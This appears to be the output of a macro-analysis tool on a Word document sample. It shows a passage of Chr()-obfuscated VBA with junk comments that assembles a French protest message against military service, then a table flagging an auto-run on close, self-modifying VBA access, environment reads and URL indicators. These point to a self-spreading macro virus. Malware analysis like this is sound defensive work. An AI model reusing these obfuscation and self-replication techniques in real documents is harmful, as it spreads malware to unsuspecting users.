Chr(32) + "000" + Chr(32) + "jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32): c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," _
+ Chr(32) + "rêveurs," + Chr(32) ' kfyllqh
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs" ' yvuqpcqiewhula
b2 = Chr(32) + "ou" + _
Chr(32) + "tout" + Chr(32) _
+ "simplement" + _
Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) _
+ "Vie" + Chr(32): b2 = b2 + "pour" + Chr(32) + "ces" _
+ Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + "Ils" + Chr(32) + _
"refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "inégalitaire" + Chr(32): b2 _
= b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) _
+ "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' afmsohjth
b1 = b1 + Chr(32) _
+ "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + _
"du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N." ' pwtwip
a1 = a1 + Chr(32) + "qui" + Chr(32) + "tue" + Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn" ' duxtdym
e4 = Chr(80) + _
Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) ' lvxktmpynf
j17 = Chr(69) + Chr(110) + Chr(100): c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) ' jpsxeqgovdu
End Sub ' bswsfwa

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
+----------+--------------------+---------------------------------------------+
